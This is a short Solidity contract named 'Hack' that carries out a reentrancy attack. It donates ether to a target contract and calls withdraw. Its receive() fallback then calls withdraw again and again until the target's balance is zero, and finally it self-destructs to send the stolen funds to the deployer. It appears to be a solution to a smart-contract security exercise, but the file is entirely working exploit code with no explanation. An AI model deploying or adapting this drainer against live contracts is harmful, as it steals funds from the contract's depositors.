// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;





contract Hack {
    
    address public target;    

    constructor (address payable _target) payable {
        target = _target;
        target.call{value: 1 ether}(abi.encodeWithSignature("donate(address)", [msg.sender])); 
        target.call(abi.encodeWithSignature("withdraw(uint256)", [1 ether]));
        require(target.balance==0, "Failed");
        selfdestruct(payable(msg.sender));           
    
    }
    


    receive() external payable {
        uint amount = min(3e17, target.balance);
        if (amount > 0) { 
            target.call(abi.encodeWithSignature("withdraw(uint256)", [amount]));
    }
    }

    function min(uint x, uint y) private pure returns (uint) {
        return x <= y ? x : y;
    }

}


